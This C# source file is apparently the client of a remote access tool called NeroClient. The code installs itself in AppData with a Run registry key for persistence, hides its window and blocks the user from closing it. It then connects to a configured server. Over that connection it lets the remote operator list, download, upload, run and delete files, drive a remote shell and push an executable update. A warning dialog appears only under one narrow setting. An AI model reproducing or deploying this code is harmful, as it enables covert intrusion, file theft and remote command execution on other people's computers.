using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using NeroClient.Helpers;
using NeroClient.Helpers.Networking;
using NeroClient.Helpers.Services;
using NeroClient.Helpers.Telepathy;
using Message = NeroClient.Helpers.Telepathy.Message;

namespace NeroClient.Forms
{
    public partial class Nero : Form
    {
        #region Connect Loop
        //Connect to server, then loop data receiving
        private async void ConnectLoop()
        {
            try
            {
                // Check if DNS is a URL.
                string IPAddress = ClientSettings.DNS;
                int PORT = Port;
                if (IPAddress.Contains("//"))
                {
                    using (WebClient wc = new WebClient())
                    {

                        string response = wc.DownloadString(IPAddress);
                        IPAddress = response.Split(':')[0];
                        PORT = Convert.ToInt32(response.Split(':')[1]);

                    }
                }


                while (!Networking.MainClient.Connected)
                {
                    await Task.Delay(50);
                    Networking.MainClient.Connect(IPAddress, PORT);
                }

                while (Networking.MainClient.Connected)
                {
                    await Task.Delay(Interval);
                    GetData();
                }

            }
            catch { Thread.Sleep(5000); } // Attempt to connect again after 5 seconds

            ConnectLoop();
        }

        #endregion Connect Loop

        #region Declaration

        private readonly int Interval;
        private readonly int Port;
        private readonly bool Install;
        private readonly bool Startup;
        private bool ReceivingFile;
        private bool UpdateMode;
        private string CurrentDirectory;
        private string FileToWrite;
        private string UpdateFileName;
        private readonly string InstallPath;
        private readonly string AudioPath;

        #endregion Declaration

        #region Uninstall/Install

        //Uninstall client
        private void UninstallClient()
        {
            if (Install && Startup)
            {
                RegistryKey RK =
                    Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                RK.DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), false);
            }
        }

        //Install client
        private void InstallClient()
        {
            if (Application.ExecutablePath == InstallPath)
            {
                if (!Startup) return;
                RegistryKey RK =
                    Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                RK.DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), false);
                RK.SetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), InstallPath);
                return;
            }

            File.Copy(Application.ExecutablePath, InstallPath, true);
            Process.Start(InstallPath);
            Process.GetCurrentProcess().Kill();
        }

        //Checks if .NET version is high enough
        private bool NetUpdated()
        {
            string Key = @"SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\";
            RegistryKey NDP = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey(Key);
            int ReleaseNum = (int) NDP.GetValue("Release");
            return ReleaseNum >= 378389;
        }

        #endregion Uninstall/Install

        #region Form

        //Entry
        public Nero()
        {
            InitializeComponent();
            if (!NetUpdated())
                Process.Start("dotnetfx.exe");
            Interval = Convert.ToInt16(ClientSettings.UpdateInterval);
            Port = Convert.ToInt16(ClientSettings.Port);
            if (string.Equals(ClientSettings.Install, "true", StringComparison.OrdinalIgnoreCase)) Install = true;
            if (string.Equals(ClientSettings.Startup, "true", StringComparison.OrdinalIgnoreCase)) Startup = true;
            InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + AppDomain.CurrentDomain.FriendlyName;
            AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";
            if (!Install && Application.ExecutablePath == InstallPath)
            {
                DialogResult dlgresult = MessageBox.Show("This is a reverse shell tool, which gives access to this machine remotely from anywhere!\nAre you sure you want to install this program?", "Are you sure?", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning);
                if (dlgresult == DialogResult.No)
                {
                    Environment.Exit(0);
                    Application.Exit();
                }
            }
            InstallClient();
        }

        //Prevent any closing of the form
        private void OnClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
                e.Cancel = true;
        }

        //Hide form on form load
        private void OnLoad(object sender, EventArgs e)
        {
            BeginInvoke(new MethodInvoker(delegate { Hide(); }));
        }

        //Once form is loaded, begin connect logic
        private void OnShow(object sender, EventArgs e)
        {
            ConnectLoop();
        }

        #endregion Form

        #region GetData

        //Get data that has been sent to the server
        private void GetData()
        {
            Message Data;
            while (Networking.MainClient.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        Console.WriteLine("Connected");
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add((int) DataType.ClientTag);
                        ToSend.AddRange(Encoding.ASCII.GetBytes(ClientSettings.ClientTag));
                        Networking.MainClient.Send(ToSend.ToArray());
                        ToSend.Clear();
                        ToSend.Add((int) DataType.AntiVirusTag);
                        ToSend.AddRange(Encoding.ASCII.GetBytes(""));
                        Networking.MainClient.Send(ToSend.ToArray());
                        ToSend.Clear();
                        ToSend.Add((int) DataType.WindowsVersionTag);
                        ToSend.AddRange(Encoding.ASCII.GetBytes(""));
                        Networking.MainClient.Send(ToSend.ToArray());
                        break;

                    case EventType.Disconnected:
                        break;

                    case EventType.Data:
                        HandleData(Data.data);
                        break;
                }
        }

        //Handle data sent to client
        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        private void HandleData(byte[] RawData)
        {
            if (ReceivingFile)
            {
                try
                {
                    if (UpdateMode)
                    {
                        try
                        {
                            if (!UpdateFileName.Contains(".exe"))
                                UpdateFileName += ".exe";

                            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\";
                            File.WriteAllBytes(path + UpdateFileName, RawData);
                            Process.Start(path + UpdateFileName);
                            KillClient();
                        }
                        catch { }

                        return;
                    }

                    string Directory = CurrentDirectory;
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    File.WriteAllBytes(FileToWrite, RawData);
                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.CreationTime + "]";
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int) DataType.FilesListType);
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                    Networking.MainClient.Send(ToSend.ToArray());
                    ToSend.Clear();
                    ToSend.Add((int) DataType.NotificationType);
                    ToSend.AddRange(
                        Encoding.ASCII.GetBytes("The file " + Path.GetFileName(FileToWrite) + " was uploaded."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch { }

                ReceivingFile = false;
                return;
            }

            string StringForm = string.Empty;
            try
            {
                StringForm = Encoding.ASCII.GetString(RawData);
            }
            catch { }

            #region Non-Parameterized Commands

            switch (StringForm)
            {
                case "KillClient":
                    KillClient();
                    break;

                case "DisconnectClient":
                    DisconnectClient();
                    break;

                case "GoUpDir":
                    GoUpDir();
                    break;

                case "StartRS":
                    StartRS();
                    break;

                case "StopRS":
                    StopRS();
                    break;

                case "StartUsageStream":
                    StartUsageStream();
                    break;

                case "StopUsageStream":
                    StopUsageStream();
                    break;
            }

            #endregion Non-Parameterized Commands

            #region Parameterized Commands

           if (StringForm.Contains("GetDF"))
                GetDF(StringForm);
            else if (StringForm.Contains("GetFile"))
                GetFile(StringForm);
            else if (StringForm.Contains("StartFileReceive"))
                StartFileReceive(StringForm);
            else if (StringForm.Contains("TryOpen"))
                TryOpen(StringForm);
            else if (StringForm.Contains("DeleteFile"))
                DeleteFile(StringForm);
            else if (StringForm.Contains("[<COMMAND>]"))
                Command(StringForm.Replace("[<COMMAND>]", ""));

            #endregion Parameterized Commands
        }

        #endregion GetData

        #region Functions

        //Uninstalls, then kills client
        private void KillClient()
        {
            UninstallClient();
            try
            {
                Process.GetCurrentProcess().Kill();
            }
            catch
            {
                Environment.Exit(0);
            }
        }

        //Disconnects client
        private void DisconnectClient()
        {
            Networking.MainClient.Disconnect();
        }

        //Gets directory files
        private void GetDF(string Data)
        {
            try
            {
                string Directory = GetSubstringByString("{", "}", Data);
                if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                string Files = string.Empty;
                DirectoryInfo DI = new DirectoryInfo(Directory);
                foreach (var F in DI.GetDirectories())
                    Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                foreach (FileInfo F in DI.GetFiles())
                    Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                             F.CreationTime + "]";
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.FilesListType);
                ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                Networking.MainClient.Send(ToSend.ToArray());
                CurrentDirectory = Directory;
                ToSend.Clear();
                ToSend.Add((int) DataType.CurrentDirectoryType);
                ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        //Gets specified file
        private void GetFile(string Data)
        {
            try
            {
                string FileString = GetSubstringByString("{[", "]}", Data);
                byte[] FileBytes;
                using (FileStream FS = new FileStream(FileString, FileMode.Open))
                {
                    FileBytes = new byte[FS.Length];
                    FS.Read(FileBytes, 0, FileBytes.Length);
                }

                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.FileType);
                ToSend.AddRange(FileBytes);
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch (Exception EX)
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Error Downloading: " + EX.Message + ")"));
                Networking.MainClient.Send(ToSend.ToArray());
            }
        }

        //Starts file uploading process
        private void StartFileReceive(string Data)
        {
            try
            {
                Random R = new Random();
                FileToWrite = GetSubstringByString("{", "}", Data);
                if (FileToWrite.Contains("[UPDATE]"))
                {
                    UpdateMode = true;
                    UpdateFileName = FileToWrite.Replace("[UPDATE]", "");
                    if (UpdateFileName == AppDomain.CurrentDomain.FriendlyName)
                        UpdateFileName = "Updated" + R.Next(0, 1000);
                }

                ReceivingFile = true;
            }
            catch { }
        }

        //Tries to open a file
        private void TryOpen(string Data)
        {
            string ToOpen = GetSubstringByString("{", "}", Data);
            try
            {
                Process.Start(ToOpen);
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToOpen) + " was opened."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        //Deletes specified file
        private void DeleteFile(string Data)
        {
            try
            {
                string ToDelete = GetSubstringByString("{", "}", Data);
                File.Delete(ToDelete);
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(
                    Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToDelete) + " was deleted."));
                Networking.MainClient.Send(ToSend.ToArray());
                GetDF(CurrentDirectory);
            }
            catch { }
        }

        //Writes command to shell 
        private void Command(string Command)
        {
            RemoteShellStream.WriteLine = true;
            RemoteShellStream.Input = Command;
        }

        //Goes up directory
        private void GoUpDir()
        {
            try
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add(7); //Directory Up Type
                CurrentDirectory = Directory.GetParent(CurrentDirectory).ToString();
                ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        //Starts remote shell
        private void StartRS()
        {
            RemoteShellStream.Start();
        }

        //Stops remote shell
        private void StopRS()
        {
            RemoteShellStream.Stop();
        }

        //Starts hardware usage stream
        private void StartUsageStream()
        {
            HardwareUsageStream.Start();
        }

        //Stops hardware usage stream
        private void StopUsageStream()
        {
            HardwareUsageStream.Stop();
        }

        //Pulls text out between two strings
        private string GetSubstringByString(string a, string b, string c)
        {
            try
            {
                return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
            }
            catch
            {
                return "";
            }
        }
        #endregion Functions
    }
}